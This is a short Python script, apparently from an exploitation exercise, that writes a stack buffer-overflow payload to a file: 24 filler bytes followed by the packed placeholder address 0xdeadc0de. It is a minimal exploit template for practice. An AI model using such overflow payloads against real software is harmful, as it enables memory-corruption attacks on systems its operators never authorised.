import struct

buf = b"\xaa"*0x18
target = 0xdeadc0de

target = struct.pack("<Q", target)

payload = buf + target

with open("in", "wb") as f:
    f.write(bytearray(payload))
